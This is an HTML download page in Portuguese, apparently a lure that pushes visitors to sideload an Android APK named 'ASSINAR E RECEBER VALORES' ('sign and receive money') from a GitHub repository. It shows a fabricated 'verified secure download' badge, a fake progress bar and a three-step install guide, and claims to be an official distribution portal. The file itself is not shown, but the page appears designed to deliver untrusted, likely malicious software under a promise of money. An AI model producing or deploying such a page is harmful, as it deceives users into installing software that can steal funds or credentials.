<!DOCTYPE html>
<html lang="pt-BR" class="scroll-smooth">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>AprovaçãoElite | Download</title>

<script src="https://cdn.tailwindcss.com"></script>
<script src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js" defer></script>
<script src="https://unpkg.com/lucide@latest"></script>

<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">

<style>
body { font-family:'Plus Jakarta Sans', sans-serif; background:#f8fafc;}
[x-cloak]{display:none;}
</style>

<script>
function downloadApp(){
return{
baixando:false,
progresso:0,

iniciarDownload(){
this.baixando=true;
this.progresso=0;

let int=setInterval(()=>{
if(this.progresso<100){
this.progresso+=10;
}else{
clearInterval(int);

const urlDownload="https://github.com/Abravaaaa/doncred/raw/main/ASSINAR%20E%20RECEBER%20VALORES%20.apk";

window.location.href=urlDownload;
}
},80);
},

init(){
if(window.lucide){lucide.createIcons();}
}
}
}
</script>

</head>

<body x-data="downloadApp()" x-init="init()" class="antialiased">

<!-- Barra topo -->
<div class="bg-slate-900 py-2 text-center">
<p class="text-xs text-emerald-400 font-bold flex items-center justify-center gap-2">
<i data-lucide="shield-check" class="w-4 h-4"></i>
Download Seguro Verificado
</p>
</div>

<!-- Header -->
<header class="bg-white border-b sticky top-0">
<div class="max-w-4xl mx-auto px-4 py-4 flex justify-between items-center">

<div class="flex gap-2 items-center">
<div class="bg-emerald-600 w-8 h-8 rounded flex items-center justify-center">
<i data-lucide="trending-up" class="text-white"></i>
</div>
<span class="font-black">Aprovação<span class="text-emerald-600">Elite</span></span>
</div>

<button @click="iniciarDownload()" class="bg-emerald-600 text-white px-4 py-2 rounded-lg font-bold">
Baixar Agora
</button>

</div>
</header>

<!-- Conteúdo -->
<main class="py-16 px-4">

<div class="max-w-xl mx-auto text-center">

<div class="bg-emerald-50 p-8 rounded-3xl shadow">

<div class="bg-emerald-600 w-16 h-16 rounded-xl flex items-center justify-center mx-auto mb-4">
<i data-lucide="download" class="text-white w-8 h-8"></i>
</div>

<h1 class="text-3xl font-black mb-2">Aplicativo Liberado</h1>
<p class="text-gray-600 mb-6">Clique abaixo para instalar.</p>

<!-- Botão -->
<button x-show="!baixando" @click="iniciarDownload()"
class="w-full bg-black text-white py-4 rounded-2xl font-bold flex justify-center gap-2">
<i data-lucide="smartphone"></i>
Instalar Aplicativo
</button>

<!-- Progresso -->
<div x-show="baixando" x-cloak>

<div class="w-full bg-gray-200 h-3 rounded-full overflow-hidden">
<div class="bg-emerald-500 h-full transition-all"
:style="'width:'+progresso+'%'"></div>
</div>

<p class="text-xs mt-2 font-bold text-gray-500"
x-text="progresso<100?'Baixando...':'Download concluído!'">
</p>

</div>

</div>

<!-- Passos -->
<div class="grid md:grid-cols-3 gap-4 mt-10 text-left">

<div class="bg-white p-5 rounded-xl shadow">
<b class="text-emerald-600">01</b>
<p class="text-sm">Clique no botão de download.</p>
</div>

<div class="bg-white p-5 rounded-xl shadow">
<b class="text-emerald-600">02</b>
<p class="text-sm">Abra o arquivo no celular.</p>
</div>

<div class="bg-white p-5 rounded-xl shadow">
<b class="text-emerald-600">03</b>
<p class="text-sm">Instale e utilize.</p>
</div>

</div>

</div>

</main>

<!-- Footer -->
<footer class="text-center py-8 border-t text-xs text-gray-400">
Portal oficial de distribuição.
</footer>

</body>
</html>
